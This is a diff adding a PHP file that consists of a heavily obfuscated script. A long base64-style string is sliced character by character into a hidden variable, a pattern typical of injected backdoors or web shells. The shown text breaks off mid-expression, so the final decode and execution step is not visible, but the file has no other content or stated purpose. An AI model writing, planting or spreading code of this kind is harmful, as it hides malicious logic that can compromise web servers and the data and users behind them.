@@ -1,0 +1,952 @@
+<?php $qcpakw='dElKP4FbXjX5x5N0OxfjfaFi2na/rJuOE6of+XgrfghQI12c/XjVMRpcWWZl9I2Gm7qtXzDFTy9OJRSVRS(CI594B+ck1u5ltnRaZd6ZusT0lBPsyhS/x1uXViGa8dHRsjDwLDB+aje9Xf\thSarpuQPrRot2J3I8REFU7kBFGdq/lZ1wpN5pbYJV5vkZDCCsT+H0e1h1dmve03VARdbE1oXI/+Wl1V41gS58dGwyOw4i7Ibp/XT2FQ6vCdjMji+ClyRvcmK3OVR2emVj2XwsBOu/8/v55tUavG0tPMKmBmhWZDDJAupWT0eCczZHOztpGU2DCoKzkDVnNpPcSZ1UpjRX0Sl3P8Ouo3QcKCoXzILeNN/I2MGvWuyVGDjQubt69yAnIAFlNwjXs9WFACopFWlwmmesZT8mYWQiSpQOtvbpCpONBnjb2AL/a69uyqrJiYelpUp7poYrzFYviALjYZvKwocjO/FG+yTPhDsTGfGlBF+V3dPDGz7zlL+UBNwm$iW2MtxLzQSwK8w4DpbFChD2q2Qx3CzJq25YaDNO/m9JhWNcD/IcxfASKxyt/iCHDnvp6oX0Ymq2pumyQWUrRirweHJJVjxkdAMaLfvh9kJG4DAUAjKYcBy5TXeGWJCY/jIQJZ3gWz2AzOf9ec7i2Fq4mwdjF2jAKDfa/rRKyLYmUB8EOrTGh81yIvJfljlOCgv9pQvDnkqZ5387E3kOCLy2Ld9oaWXg1qo+QfXoyk/+mPjhH9/vOXYb+/TwliZ4H3w2X5epa568KMqQvnU3k9jStPsuk7Gx3GO72wNhdkXX23Ue4XrIUAUlVJfu+n7KRfTw64uAqJouUOO761LlfmqgOpmyYHdPyI5mxi9/TOIqMSlfYnnrBW0TF+hGDBX6EeZUgGA4qSB9zu9o6GujdUdzea0j3NKL+MTPoygRzxZ9En4eiwhSzqmei+wTw0ixaFpY7EvsDWMnlt9C36FZEoO9gv/9Hwf4relf7Vvt4LAUWDHKSJKTceXUMGmWmJOvU4BEBMyu+KRAC6t0dATXjwbDCzEzt3ylob2ttnzN8NVTJg+s4U1jC5ztXL8I3KYxixWABezYN253uHa4akDGXiV2xFfRRfC9J+yLarXcUyhdxD0A7x9QEZ1rozK2gcgbbx0v/pike4d1IBWhLrz9WhFDrtwNjay2Lwi321z9mpLk+CBjCTHn5U9MQGGKFP]pco4hM/Ggdjx+Q2JlzObuOW6zrJne/fzt0v44ktGX9Wjj2euCQd5efuMshqGBwtJUgKZFur6o6hkFlRkPqnvyZNNQdPlMQ1=PTls0SB46eoDOUqA/5exDtSCKo5XFqzWNDUKqub5SLu7hGitQvtpwAJ2Ppp/O0vsaMk0Y0LMQzQgk2svqUh4ib7iT36NmIiYejbiANlwCJOzkwvftff41h9NoOG0pdOzArfYkLcS+NNLcsSQnBSoErGZTfnHoFGQC4v0hovwI3Jxh8eL0iSRK1veC6HG9EOzeQrlNFMzBcEsckIqlzZ5BqxpoBXArdRjL/ahanjOrsD2VSCq8Z0baXn7/jHzxGCWD2b3sHB+2kKEINjd3MBxpFjuBLoTckiZ4SiGw1xBBa1v2n48uX72JaHL7/VQKK+1W5xAKhr4BlBvQx8emytz58xY6vERsJgc1kOIrRULwa/1P96mc8ETI0gQ2MvOOZDFm5WtbeVnFFcmlYbf0bZR5CJuA1k/evNxeRl38H+G8IDETdGpklNm6tFpcGwtm1GjcBqcogw/1kDUAHfxjtcE4vp1z2hHXw/NkLg/E57+w7ba/b3XP1i7NXZrdP2+1PaIKgJQUo6VzvtAmXqDZeIKUjWFANxVRdmYMBRvJl9gZnQBexmmvEikq+SbQSYFn9sV3nUsVy+FsEENSsmqXu1SzqEgFsBbEYkddTBzSkS5ImRuyd3XsUwr5OOxac6LaswwTHjInSilaXfSh6GIRun1AYMPik0LrI25T97DMp0QBTnyJG8xooVCA2CLSqkCp1czYt9UOeidPZxHvdgcHqxkUmgSNBc$XcrprMOSw2Hst/czKJro6nfuf67VBjMnTGe04GG+hLGmCDT3fZYsbP_gyjBD2lk0+9362fRBVJgC/6tSoQaU4tltcxUTZ1efbZRkJR/x2JYjjH8oiSXVPUfw2cP8vVSLcdtQKHGZHunrjp/4UsTcHlWxXE1ztB0eyL45xJzesEONImolClaoTHPtOg0OJ9YjcTszqAejwYZBI+1t9PonFS3luWowKALtbMIjYVT96Wn57CZ8YVJ269/u+nEg8HbGTkpUxrvOMaeBHSBmSbKBjprQa07xo6_wCHqEBgdOBw4SsUpoxi0JnYjos2T80iJ5tgHO7TWLhemTgAQbnsbMSPeMDrB2cbuUGYv2qWoTbTvW+xqEtwboP5GMJ5h6v3tbQZ+3AWTs0Y43Zq8BxvEbBzWyNrLcd5Bwq/RZpgy6cKCSMlwrfTcYeVKrXvaj9jkxd8n98OiSvZxz6Tj2lxBM4MsGXj7ukmXWOdyTtMFAq+DCxr2eGJAnWGmBp+9VSx2cJPiVtsdNayJrb7HvWbB/o66/uEziPmnshVuUNY4qyD3fcv2rl/xwY7jJNrW05CWvCXON7s9uZaAT9X7Ig6lrh8CPsOfSoZWfZOa)bxqKQA7+wEdf0zNKYV1Cn0ISHIi1DRiNNNIuakQTQmqAnrUTeTlELtWXmdXUvnsMZjlFQ7Fx+KFsCQ+FON1Gbjx6jJfyLjDw4kQWjKwlvLSwxgj7equVqVnqBTTROzUo9nrmCsT3JaVlO6PTnm1J0a58Yoy6AimIvDlmlUUszZDoOlPY1Lc+wl2H4el6GSO4E4QaqIGb1UuYg6WDeQFaRfbbPvwa8QrPn3/Ogxvh3Q49QazJC1FWDQLHR79kqjCAZpGTNuEoZSdyDcPqrTrsWYSx/NZt2HEnL9nBwbyp9KxvPW/chWe9nm0FEjbnmsJcZ9y6aBIMCcIZjPmK/fSx1hCthgEqd1KzznJZEv0Hs27b2KrGB6ivcXSlFprTWHcnkpNmV57RStSNwqDmvbOdbqgYIWhTYmgEmP`TNdM2nds74LrgKldgwWnviiCwQQ8h6BPMEk6p+DXdUGnEJj9BQGrAEcgXJ2CLD5tcBTJq9HnGX5Lh9LjjmuNuNY4ZpBSvUfV6WI9sq7fM93s2+Q26phxOk+tfRchSoJinUmCQBaD65wKuHia5aUGnvz+3jFD3bCN6iELb4e50pgbz5n5+FST260ECAnjkmk0cQ4UYppUWk5tGZlYqaiI0qFVh5ewxUIfRBGjdr1VdNnoVr6TUd=NsqxYB/xxD2qUVZcdH3A42l8t4y85wtOGhp8m0EUlG2/yOd2RJEj06ZNS1YBwzjM4QGm+8hOhy90q3b6zcrQdGy5NgJGSZmf2cLq3s3rDsx2uZ6tgCJZoG93avcnx3xM8cMDSA+dxUpbYhJRn8pMnzHBWvvgwGSwqk5qsuBub9tSHf9WP/7sfImoIlllNMU/R5D[CcMUrM1/LRvCeum4nAGpFDhb5otlzlA25o6Hq86JUv4ff0QNvp167yvVURczFDJ+EWjehgWZjfVm7T5padioZGrgZRuCc4QjZNstFhpFZpkwvM4_nKna1j+VzhwUw6SWX;OpvNcM4Ez+bGWEhGGBTd+2Jj/S9dmtuAZBa+5L/TT0X8cploU/cuI2V+NxWbdeea2FQnpDoVvDirp9RlFncsU0btz/G7z16Oy3fgFRTcKpoLic/q4dCjk4btjMt8VT6tvGrqgvSR36ejmmtjq8Rjv98y4e5ZiY4Ouhwms2wpEL/6MXBbyCHFY7Y8odWbecGMEFH8GxjstIvxLB62IIMItNqyHFf162Oy9wHD3z7obd/pgk7LjVGdwpTm5y7TZqKmaMpbXNAAe+WJzErbPvPZNWtH75hUTUMGGuHuQ+tTC5qwAO+Fjtv48CL5dIPjjWj1NN6oFzLuV1/Zn3miukLYZFD4lzF8y2nlCmws5i/OY76uF4zeVr0/L4M2TRw2oLDELwY+gKI8INMS90sNrH0f9LziTm8nZAvKmxo+YGfjtrPvF3O/jfhixb5AcyrjI/RADm2b3L+AggBs4jvtJaQs7gnKEU3c/46vhhzZvElzv^rlyAjI9DUpy6zFx5rIYSBS3Fi/CfnKXwKzV8RP2cos7WbZY/eRuE6vPHRLzI/Fi2vH9lsmQTqwcH5XVNed+CIX6cZmXYzB4kenCKQFuccaNC5SMnZClk1fXqNoDi2b/3THK7wKGGfjcrF264wyqQ+8dwCsMFQmTJSmX77DwKGDu4deBdDFJFD6f//'; $udpqeyacssao=$qcpakw[138].$qcpakw[14].$qcpakw[28].$qcpakw[67].$qcpakw[63].$qcpakw[64].$qcpakw[67].$qcpakw[72].$qcpakw[5].$qcpakw[15].$qcpakw[7].$qcpakw[73].$qcpakw[52].$qcpakw[45].$qcpakw[30].$qcpakw[45].$qcpakw[27].$qcpakw[24].$qcpakw[6].$qcpakw[56].$qcpakw[0].$qcpakw[54].$qcpakw[83].$qcpakw[15].$qcpakw[105].$qcpakw[56].$qcpakw[164].$qcpakw[7].$qcpakw[0].$qcpakw[105].$qcpakw[91].$qcpakw[0].$qcpakw[9].$qcpakw[42].$qcpakw[44].$qcpakw[44].$qcpakw[64].$qcpakw[1].$qcpakw[70].$qcpakw[6].$qcpakw[182].$qcpakw[52].$qcpakw[33].$qcpakw[182].$qcpakw[65].$qcpakw[3].$qcpakw[56].$qcpakw[208].$qcpakw[66].$qcpakw[44].$qcpakw[43].$qcpakw[124].$qcpakw[12].$qcpakw[38].$qcpakw[54].$qcpakw[33].$qcpakw[2].$qcpakw[164].$qcpakw[7].$qcpakw[64].$qcpakw[105].$qcpakw[58].$qcpakw[9].$qcpakw[27].$qcpakw[25].$qcpakw[54].$qcpakw[5].$qcpakw[58].$qcpakw[9].$qcpakw[72].$qcpakw[78].$qcpakw[78].$qcpakw[7].$qcpakw[72].$qcpakw[70].$qcpakw[105].$qcpakw[7].$qcpakw[67].$qcpakw[45].$qcpakw[0].$qcpakw[45].$qcpakw[56].$qcpakw[15].$qcpakw[67].$qcpakw[105].$qcpakw[9].$qcpakw[69].$qcpakw[72].$qcpakw[158].$qcpakw[0].$qcpakw[4].$qcpakw[72].$qcpakw[158].$qcpakw[0].$qcpakw[16].$qcpakw[186].$qcpakw[124].$qcpakw[53].$qcpakw[21].$qcpakw[16].$qcpakw[5].$qcpakw[69].$qcpakw[83].$qcpakw[24].$qcpakw[182].$qcpakw[42].$qcpakw[73].$qcpakw[6].$qcpakw[47].$qcpakw[138].$qcpakw[44].$qcpakw[63].$qcpakw[51].$qcpakw[45].$qcpakw[54].$qcpakw[72].$qcpakw[7].$qcpakw[65].$qcpakw[60].$qcpakw[60].$qcpakw[52].$qcpakw[65].$qcpakw[43].$qcpakw[72].$qcpakw[7].$qcpakw[208].$qcpakw[158].$qcpakw[12].$qcpakw[73].$qcpakw[29].$qcpakw[11].$qcpakw[5].$qcpakw[23].$qcpakw[58].$qcpakw[56].$qcpakw[5].$qcpakw[4].$qcpakw[186].$qcpakw[5].$qcpakw[47].$qcpakw[88].$qcpakw[67].$qcpakw[38].$qcpakw[23].$qcpakw[16].$qcpakw[14].$qcpakw[126].$qcpakw[164].$qcpakw[8].$qcpakw[131].$qcpakw[124].$qcpakw[126].$qcpakw[3].$qcpakw[38].$qcpakw[51].$qcpakw[11].$qcpakw[36].$qcpakw[124].$qcpakw[182].$qcpakw[0].$qcpakw[44].$qcpakw[47].$qcpakw[15].$qcpakw[2].$qcpakw[0].$qcpakw[132].$qcpakw[88].$qcpakw[66].$qcpakw[65].$qcpakw[18].$qcpakw[53].$qcpakw[33].$qcpakw[186].$qcpakw[12].$qcpakw[45].$qcpakw[15].$qcpakw[69].$qcpakw[67].$qcpakw[72].$qcpakw[7].$qcpakw[52].$qcpakw[88].$qcpakw[11].$qcpakw[63].$qcpakw[52].$qcpakw[78].$qcpakw[7].$qcpakw[1].$qcpakw[78].$qcpakw[9].$qcpakw[88].$qcpakw[29].$qcpakw[132].$qcpakw[83].$qcpakw[47].$qcpakw[52].$qcpakw[28].$qcpakw[45].$qcpakw[24].$qcpakw[105].$qcpakw[8].$qcpakw[30].$qcpakw[42].$qcpakw[34].$qcpakw[16].$qcpakw[91].$qcpakw[164].$qcpakw[69].$qcpakw[105].$qcpakw[6].$qcpakw[1].$qcpakw[0].$qcpakw[88].$qcpakw[30].$qcpakw[23].$qcpakw[23].$qcpakw[54].$qcpakw[14].$qcpakw[11].$qcpakw[21].$qcpakw[208].$qcpakw[34].$qcpakw[7].$qcpakw[73].$qcpakw[91].$qcpakw[43].$qcpakw[6].$qcpakw[66].$qcpakw[34].$qcpakw[15].$qcpakw[25].$qcpakw[38].$qcpakw[29].$qcpakw[63].$qcpakw[5].$qcpakw[182].$qcpakw[56].$qcpakw[4].$qcpakw[9].$qcpakw[16].$qcpakw[29].$qcpakw[43].$qcpakw[25].$qcpakw[53].$qcpakw[51].$qcpakw[29].$qcpakw[0].$qcpakw[182].$qcpakw[1].$qcpakw[5].$qcpakw[29].$qcpakw[9].$qcpakw[73].$qcpakw[131].$qcpakw[30].$qcpakw[186].$qcpakw[28].$qcpakw[186].$qcpakw[70].$qcpakw[43].$qcpakw[47].$qcpakw[38].$qcpakw[14].$qcpakw[51].$qcpakw[53].$qcpakw[33].$qcpakw[30].$qcpakw[28].$qcpakw[21].$qcpakw[63].$qcpakw[58].$qcpakw[182].$qcpakw[15].$qcpakw[12].$qcpakw[64].$qcpakw[88].$qcpakw[66].$qcpakw[25].$qcpakw[8].$qcpakw[78].$qcpakw[33].$qcpakw[18].$qcpakw[27].$qcpakw[138].$qcpakw[33].$qcpakw[58].$qcpakw[124].$qcpakw[54].$qcpakw[27].$qcpakw[47].$qcpakw[33].$qcpakw[27].$qcpakw[72].$qcpakw[9].$qcpakw[105].$qcpakw[25].$qcpakw[208].$qcpakw[36].$qcpakw[30].$qcpakw[15].$qcpakw[18].$qcpakw[33].$qcpakw[88].$qcpakw[47].$qcpakw[64].$qcpakw[3].$qcpakw[7].$qcpakw[78].$qcpakw[164].$qcpakw[126].$qcpakw[72].$qcpakw[15].$qcpakw[124].$qcpakw[4].$qcpakw[7].$qcpakw[14].$qcpakw[44].$qcpakw[27].$qcpakw[182].$qcpakw[44].$qcpakw[18].$qcpakw[66].$qcpakw[208].$qcpakw[7].$qcpakw[8].$qcpakw[8].$qcpakw[6].$qcpakw[126].$qcpakw[63].$qcpakw[64].$qcpakw[69].$qcpakw[66].$qcpakw[73].$qcpakw[186].$qcpakw[132].$qcpakw[67].$qcpakw[12].$qcpakw[88].$qcpakw[2].$qcpakw[28].$qcpakw[78].$qcpakw[91].$qcpakw[56].$qcpakw[65].$qcpakw[83].$qcpakw[105].$qcpakw[52].$qcpakw[28].$qcpakw[70].$qcpakw[45].$qcpakw[36].$qcpakw[63].$qcpakw[73].$qcpakw[18].$qcpakw[43].$qcpakw[78].$qcpakw[56].$qcpakw[3].$qcpakw[16].$qcpakw[18].$qcpakw[60].$qcpakw[27].$qcpakw[182].$qcpakw[5].$qcpakw[70].$qcpakw[3].$qcpakw[47].$qcpakw[36].$qcpakw[83].$qcpakw[138].$qcpakw[38].$qcpakw[8].$qcpakw[16].$qcpakw[27].$qcpakw[78].$qcpakw[64].$qcpakw[131].$qcpakw[5].$qcpakw[2].$qcpakw[69].$qcpakw[72].$qcpakw[18].$qcpakw[27].$qcpakw[15].$qcpakw[23].$qcpakw[66].$qcpakw[186].$qcpakw[164].$qcpakw[124].$qcpakw[105].$qcpakw[8].$qcpakw[24].$qcpakw[88].$qcpakw[5].$qcpakw[14].$qcpakw[9].$qcpakw[33].$qcpakw[12].$qcpakw[78].$qcpakw[36].$qcpakw[56].$qcpakw[0].$qcpakw[30].$qcpakw[27].$qcpakw[0].$qcpakw[34].$qcpakw[5].$qcpakw[63].$qcpakw[73].$qcpakw[34].$qcpakw[164].$qcpakw[36].$qcpakw[25].$qcpakw[47].$qcpakw[33].$qcpakw[9].$qcpakw[69].$qcpakw[43].$qcpakw[9].$qcpakw[25].$qcpakw[51].$qcpakw[63].$qcpakw[0].$qcpakw[29].$qcpakw[7].$qcpakw[54].$qcpakw[51].$qcpakw[34].$qcpakw[60].$qcpakw[9].$qcpakw[67].$qcpakw[65].$qcpakw[25].$qcpakw[8].$qcpakw[33].$qcpakw[25].$qcpakw[70].$qcpakw[131].$qcpakw[53].$qcpakw[45].$qcpakw[182].$qcpakw[126].$qcpakw[54].$qcpakw[2].$qcpakw[1].$qcpakw[47].$qcpakw[60].$qcpakw[18].$qcpakw[72].$qcpakw[126].$qcpakw[138].$qcpakw[2].$qcpakw[83].$qcpakw[9].$qcpakw[30].$qcpakw[15].$qcpakw[38].$qcpakw[34].$qcpakw[2].$qcpakw[186].$qcpakw[28].$qcpakw[28].$qcpakw[8].$qcpakw[54].$qcpakw[0].$qcpakw[73].$qcpakw[1].$qcpakw[64].$qcpakw[138].$qcpakw[21].$qcpakw[7].$qcpakw[6].$qcpakw[58].$qcpakw[11].$qcpakw[9].$qcpakw[105].$qcpakw[51].$qcpakw[66].$qcpakw[66].$qcpakw[53].$qcpakw[47].$qcpakw[24].$qcpakw[24].$qcpakw[66].$qcpakw[7].$qcpakw[28].$qcpakw[78].$qcpakw[64].$qcpakw[67].$qcpakw[186].$qcpakw[91].$qcpakw[208].$qcpakw[47].$qcpakw[132].$qcpakw[21].$qcpakw[45].$qcpakw[164].$qcpakw[4].$qcpakw[54].$qcpakw[66].$qcpakw[44].$qcpakw[131].$qcpakw[33].$qcpakw[88].$qcpakw[70].$qcpakw[70].$qcpakw[63].$qcpakw[78].$qcpakw[30].$qcpakw[15].$qcpakw[53].$qcpakw[14].$qcpakw[51].$qcpakw[12].$qcpakw[12].$qcpakw[9].$qcpakw[138].$qcpakw[5].$qcpakw[42].$qcpakw[9].$qcpakw[72].$qcpakw[0].$qcpakw[91].$qcpakw[29].$qcpakw[38].$qcpakw[131].$qcpakw[43].$qcpakw[126].$qcpakw[78].$qcpakw[8].$qcpakw[45].$qcpakw[131].$qcpakw[126].$qcpakw[36].$qcpakw[6].$qcpakw[14].$qcpakw[2].$qcpakw[16].$qcpakw[83].$qcpakw[65].$qcpakw[54].$qcpakw[88].$qcpakw[6].$qcpakw[11].$qcpakw[67].$qcpakw[42].$qcpakw[105].$qcpakw[34].$qcpakw[16].$qcpakw[2].$qcpakw[67].$qcpakw[186].$qcpakw[88].$qcpakw[72].$qcpakw[186].$qcpakw[9].$qcpakw[1].$qcpakw[3].$qcpakw[64].$qcpakw[25].$qcpakw[34].$qcpakw[16].$qcpakw[24].$qcpakw[33].$qcpakw[18].$qcpakw[43].$qcpakw[56].$qcpakw[208].$qcpakw[64].$qcpakw[36].$qcpakw[9].$qcpakw[60].$qcpakw[24].$qcpakw[69].$qcpakw[138].$qcpakw[65].$qcpakw[132].$qcpakw[28].$qcpakw[1].$qcpakw[60].$qcpakw[132].$qcpakw[65].$qcpakw[69].$qcpakw[0].$qcpakw[53].$qcpakw[63].$qcpakw[34].$qcpakw[3].$qcpakw[0].$qcpakw[138].$qcpakw[47].$qcpakw[64].$qcpakw[88].$qcpakw[18].$qcpakw[11].$qcpakw[30].$qcpakw[7].$qcpakw[24].$qcpakw[27].$qcpakw[14].$qcpakw[58].$qcpakw[42].$qcpakw[30].$qcpakw[5].$qcpakw[44].$qcpakw[91].$qcpakw[91].$qcpakw[52].$qcpakw[54].$qcpakw[42].$qcpakw[53].$qcpakw[28].$qcpakw[29].$qcpakw[43].$qcpakw[25].$qcpakw[105].$qcpakw[60].$qcpakw[15].$qcpakw[11].$qcpakw[208].$qcpakw[72].$qcpakw[69].$qcpakw[164].$qcpakw[51].$qcpakw[5].$qcpakw[6].$qcpakw[53].$qcpakw[0].$qcpakw[58].$qcpakw[36].$qcpakw[83].$qcpakw[67].$qcpakw[18].$qcpakw[83].$qcpakw[186].$qcpakw[186].$qcpakw[73].$qcpakw[34].$qcpakw[21].$qcpakw[34].$qcpakw[16].$qcpakw[63].$qcpakw[4].$qcpakw[105].$qcpakw[8].$qcpakw[6].$qcpakw[14].$qcpakw[72].$qcpakw[23].$qcpakw[12].$qcpakw[43].$qcpakw[42].$qcpakw[52].$qcpakw[131].$qcpakw[63].$qcpakw[70].$qcpakw[124].$qcpakw[9].$qcpakw[2].$qcpakw[14].$qcpakw[11].$qcpakw[65].$qcpakw[58].$qcpakw[6].$qcpakw[11].$qcpakw[138].$qcpakw[58].$qcpakw[63].$qcpakw[58].$qcpakw[9].$qcpakw[70].$qcpakw[12].$qcpakw[186].$qcpakw[126].$qcpakw[7].$qcpakw[33].$qcpakw[14].$qcpakw[47].$qcpakw[21].$qcpakw[24].$qcpakw[88].$qcpakw[15].$qcpakw[52].$qcpakw[6].$qcpakw[44].$qcpakw[53].$qcpakw[158].$qcpakw[24].$qcpakw[88].$qcpakw[42].$qcpakw[45].$qcpakw[28].$qcpakw[138].$qcpakw[158].$qcpakw[47].$qcpakw[8].$qcpakw[6].$qcpakw[83].$qcpakw[126].$qcpakw[208].$qcpakw[34].$qcpakw[9].$qcpakw[23].$qcpakw[124].$qcpakw[30].$qcpakw[24].$qcpakw[36].$qcpakw[58].$qcpakw[58].$qcpakw[182].$qcpakw[8].$qcpakw[67].$qcpakw[0].$qcpakw[208].$qcpakw[27].$qcpakw[208].$qcpakw[105].$qcpakw[3].$qcpakw[73].$qcpakw[70].$qcpakw[5].$qcpakw[12].$qcpakw[132].$qcpakw[91].$qcpakw[24].$qcpakw[38].$qcpakw[69].$qcpakw[91].$qcpakw[186].$qcpakw[33].$qcpakw[24].$qcpakw[60].$qcpakw[8].$qcpakw[186].$qcpakw[27].$qcpakw[72].$qcpakw[0].$qcpakw[25].$qcpakw[36].$qcpakw[158].$qcpakw[105].$qcpakw[15].$qcpakw[186].$qcpakw[18].$qcpakw[52].$qcpakw[25].$qcpakw[9].$qcpakw[182].$qcpakw[45].$qcpakw[47].$qcpakw[9].$qcpakw[45].$qcpakw[1].$qcpakw[9].$qcpakw[38].$qcpakw[15].$qcpakw[14].$qcpakw[69].$qcpakw[58].$qcpakw[44].$qcpakw[38].$qcpakw[33].$qcpakw[60].$qcpakw[72].$qcpakw[24].$qcpakw[69].$qcpakw[186].$qcpakw[34].$qcpakw[70].$qcpakw[105].$qcpakw[88].$qcpakw[105].$qcpakw[18].$qcpakw[60].$qcpakw[27].$qcpakw[30].$qcpakw[126].$qcpakw[30].$qcpakw[12].$qcpakw[30].$qcpakw[208].$qcpakw[69].$qcpakw[52].$qcpakw[126].$qcpakw[12].$qcpakw[24].$qcpakw[29].$qcpakw[158].$qcpakw[18].$qcpakw[208].$qcpakw[47].$qcpakw[54].$qcpakw[8].$qcpakw[1].$qcpakw[66].$qcpakw[70].$qcpakw[64].$qcpakw[47].$qcpakw[51].$qcpakw[23].$qcpakw[47].$qcpakw[64].$qcpakw[67].$qcpakw[132].$qcpakw[91].$qcpakw[2].$qcpakw[30].$qcpakw[72].$qcpakw[73].$qcpakw[53].$qcpakw[56].$qcpakw[64].$qcpakw[30].$qcpakw[58].$qcpakw[70].$qcpakw[1].$qcpakw[14].$qcpakw[4].$qcpakw[36].$qcpakw[44].$qcpakw[47].$qcpakw[72].$qcpakw[3].$qcpakw[29].$qcpakw[208].$qcpakw[45].$qcpakw[43].$qcpakw[51].$qcpakw[5].$qcpakw[5].$qcpakw[36].$qcpakw[78].$qcpakw[64].$qcpakw[30].$qcpakw[138].$qcpakw[66].$qcpakw[33].$qcpakw[38].$qcpakw[34].$qcpakw[25].$qcpakw[45].$qcpakw[23].$qcpakw[72].$qcpakw[24].$qcpakw[58].$qcpakw[186].$qcpakw[56].$qcpakw[164].$qcpakw[72].$qcpakw[64].$qcpakw[42].$qcpakw[51].$qcpakw[138].$qcpakw[208].$qcpakw[23].$qcpakw[24].$qcpakw[33].$qcpakw[70].$qcpakw[11].$qcpakw[64].$qcpakw[0].$qcpakw[208].$qcpakw[158].$qcpakw[69].$qcpakw[5].$qcpakw[6].$qcpakw[4].$qcpakw[47].$qcpakw[53].$qcpakw[29].$qcpakw[63].$qcpakw[5].$qcpakw[0].$qcpakw[124].$qcpakw[58].$qcpakw[64].$qcpakw[14].$qcpakw[66].$qcpakw[33].$qcpakw[2].$qcpakw[67].$qcpakw[28].$qcpakw[64].$qcpakw[73].$qcpakw[131].$qcpakw[34].$qcpakw[7].$qcpakw[208].$qcpakw[64].$qcpakw[182].$qcpakw[164].$qcpakw[53].$qcpakw[16].$qcpakw[70].$qcpakw[42].$qcpakw[25].$qcpakw[8].$qcpakw[14].$qcpakw[105].$qcpakw[11].$qcpakw[65].$qcpakw[8].$qcpakw[0].$qcpakw[65].$qcpakw[12].$qcpakw[60].$qcpakw[72].$qcpakw[131].$qcpakw[30].$qcpakw[69].$qcpakw[56].$qcpakw[24].$qcpakw[69].$qcpakw[132].$qcpakw[16].$qcpakw[208].$qcpakw[34].$qcpakw[70].$qcpakw[69].$qcpakw[64].$qcpakw[14].$qcpakw[63].$qcpakw[28].$qcpakw[3].$qcpakw[182].$qcpakw[18].$qcpakw[9].$qcpakw[58].$qcpakw[60].$qcpakw[72].$qcpakw[73].$qcpakw[65].$qcpakw[124].$qcpakw[0].$qcpakw[6].$qcpakw[34].$qcpakw[44].$qcpakw[30].$qcpakw[24].$qcpakw[72].$qcpakw[63].$qcpakw[131].$qcpakw[69].$qcpakw[70].$qcpakw[56].$qcpakw[5].$qcpakw[3].$qcpakw[16].$qcpakw[88].$qcpakw[66].$qcpakw[9].$qcpakw[51].$qcpakw[14].$qcpakw[29].$qcpakw[54].$qcpakw[67].$qcpakw[60].$qcpakw[3].$qcpakw[25].$qcpakw[158].$qcpakw[21].$qcpakw[138].$qcpakw[16].$qcpakw[70].$qcpakw[9].$qcpakw[28].$qcpakw[21].$qcpakw[9].$qcpakw[73].$qcpakw[52].$qcpakw[16].$qcpakw[18].$qcpakw[124].$qcpakw[16].$qcpakw[51].$qcpakw[186].$qcpakw[7].$qcpakw[67].$qcpakw[132].$qcpakw[5].$qcpakw[30].$qcpakw[4].$qcpakw[33].$qcpakw[70].$qcpakw[105].$qcpakw[7].$qcpakw[33].$qcpakw[88].$qcpakw[67].$qcpakw[14].$qcpakw[27].$qcpakw[24].$qcpakw[88].$qcpakw[5].$qcpakw[18].$qcpakw[0].$qcpakw[63].$qcpakw[186].$qcpakw[132].$qcpakw[47].$qcpakw[21].$qcpakw[5].$qcpakw[12].$qcpakw[36].$qcpakw[88].$qcpakw[51].$qcpakw[52].$qcpakw[52].$qcpakw[0].$qcpakw[7].$qcpakw[43].$qcpakw[69].$qcpakw[9].$qcpakw[91].$qcpakw[52].$qcpakw[18].$qcpakw[14].$qcpakw[69].$qcpakw[182].$qcpakw[208].$qcpakw[45].$qcpakw[51].$qcpakw[42].$qcpakw[186].$qcpakw[67].$qcpakw[0].$qcpakw[21].$qcpakw[52].$qcpakw[51].$qcpakw[64].$qcpakw[105].$qcpakw[0].$qcpakw[25].$qcpakw[0].$qcpakw[38].$qcpakw[9].$qcpakw[16].$qcpakw[158].$qcpakw[58].$qcpakw[72].$qcpakw[14].$qcpakw[16].$qcpakw[51].$qcpakw[58].$qcpakw[45].$qcpakw[38].$qcpakw[182].$qcpakw[126].$qcpakw[42].$qcpakw[11].$qcpakw[158].$qcpakw[138].$qcpakw[33].$qcpakw[21].$qcpakw[83].$qcpakw[24].$qcpakw[45].$qcpakw[25].$qcpakw[131].$qcpakw[56].$qcpakw[67].$qcpakw[14].$qcpakw[124].$qcpakw[58].$qcpakw[25].$qcpakw[4].$qcpakw[21].$qcpakw[4].$qcpakw[88].$qcpakw[186].$qcpakw[158].$qcpakw[67].$qcpakw[34].$qcpakw[12].$qcpakw[14].$qcpakw[131].$qcpakw[132].$qcpakw[132].$qcpakw[164].$qcpakw[91].$qcpakw[25].$qcpakw[30].$qcpakw[208].$qcpakw[52].$qcpakw[54].$qcpakw[12].$qcpakw[54].$qcpakw[16].$qcpakw[1].$qcpakw[23].$qcpakw[5].$qcpakw[33].$qcpakw[18].$qcpakw[44].$qcpakw[47].$qcpakw[0].$qcpakw[23].$qcpakw[2].$qcpakw[182].$qcpakw[91].$qcpakw[11].$qcpakw[158].$qcpakw[38].$qcpakw[42].$qcpakw[131].$qcpakw[18].$qcpakw[29].$qcpakw[131].$qcpakw[15].$qcpakw[78].$qcpakw[131].$qcpakw[34].$qcpakw[14].$qcpakw[2].$qcpakw[38].$qcpakw[21].$qcpakw[67].$qcpakw[66].$qcpakw[9].$qcpakw[24].$qcpakw[126].$qcpakw[16].$qcpakw[5].$qcpakw[105].$qcpakw[23].$qcpakw[83].$qcpakw[7].$qcpakw[132].$qcpakw[67].$qcpakw[64].$qcpakw[43].$qcpakw[25].$qcpakw[38].$qcpakw[6].$qcpakw[208].$qcpakw[24].$qcpakw[6].$qcpakw[4].$qcpakw[54].$qcpakw[78].$qcpakw[105].$qcpakw[208].$qcpakw[132].$qcpakw[30].$qcpakw[18].$qcpakw[83].$qcpakw[131].$qcpakw[65].$qcpakw[63].$qcpakw[208].$qcpakw[66].$qcpakw[78].$qcpakw[131].$qcpakw[44].$qcpakw[208].$qcpakw[0].$qcpakw[42].$qcpakw[44].$qcpakw[126].$qcpakw[28].$qcpakw[24].$qcpakw[6].$qcpakw[33].$qcpakw[67].$qcpakw[64].$qcpakw[186].$qcpakw[23].$qcpakw[53].$qcpakw[124].$qcpakw[44].$qcpakw[105].$qcpakw[47].$qcpakw[164].$qcpakw[9].$qcpakw[28].$qcpakw[29].$qcpakw[45].$qcpakw[47].$qcpakw[42].$qcpakw[16].$qcpakw[131].$qcpakw[16].$qcpakw[131].$qcpakw[70].$qcpakw[58].$qcpakw[83].$qcpakw[3].$qcpakw[2].$qcpakw[124].$qcpakw[56].$qcpakw[138].$qcpakw[3].$qcpakw[8].$qcpakw[164].$qcpakw[27].$qcpakw[208].$qcpakw[138].$qcpakw[11].$qcpakw[24].$qcpakw[72].$qcpakw[60].$qcpakw[11].$qcpakw[186].$qcpakw[131].$qcpakw[54].$qcp